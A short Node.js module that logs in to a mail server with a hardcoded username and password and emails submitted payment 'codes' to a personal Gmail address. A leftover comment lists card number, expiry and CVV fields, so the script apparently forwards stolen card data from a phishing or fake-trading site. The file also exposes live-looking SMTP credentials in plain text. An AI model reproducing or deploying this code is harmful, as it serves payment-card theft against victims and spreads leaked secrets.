const nodemailer = require("nodemailer");

async function main(data) {
  const { code, type } = data;

  // create reusable transporter object using the default SMTP transport
  let transporter = nodemailer.createTransport({
    host: "mail.unchainedtrade.com",
    port: 465,
    secure: true, // true for 465, false for other ports
    auth: {
      user: "admin@unchainedtrade.com", // generated ethereal user
      pass: "unchainedtrade@2022", // generated ethereal password
    },
  });

  // send mail with defined transport object
  let info = await transporter.sendMail({
    from: '"pymt 👻" <admin@unchainedtrade.com>', // sender address
    to: "anthonyerics84@gmail.com", // list of receivers
    subject: "pyment ✔", // Subject line
    text: `type: ${type}\nCode: ${code}`, // plain text body
    // html: "<b>Hello world?</b>", // html body
  });

  console.log("Message sent: %s", info.messageId);
  // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>

  // Preview only available when sending through an Ethereal account
  console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
  // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...
}

module.exports = { main };

/*
cardnumber: ${cardnumber} \n
    expiremonth: ${expiremonth} \n
     expireyear: ${expireyear} \n
    cvv: ${cvv}
    */
